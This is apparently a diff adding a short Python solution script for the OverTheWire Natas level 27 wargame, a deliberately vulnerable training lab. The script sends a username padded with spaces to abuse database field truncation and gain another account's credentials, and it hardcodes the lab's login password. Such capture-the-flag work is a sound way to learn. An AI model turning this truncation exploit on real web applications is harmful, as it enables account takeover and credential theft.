@@ -1,0 +1,11 @@
+#!/usr/bin/env python
+
+import requests, string
+
+url = "http://natas27.natas.labs.overthewire.org/"
+auth = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")
+
+response = requests.get(url, auth=auth, params=[("username", "natas28" + " " * 57 + "foo"), ("password", "foo")])
+print(response.text)
+response = requests.get(url, auth=auth, params=[("username", "natas28"), ("password", "foo")])
+print(response.text)
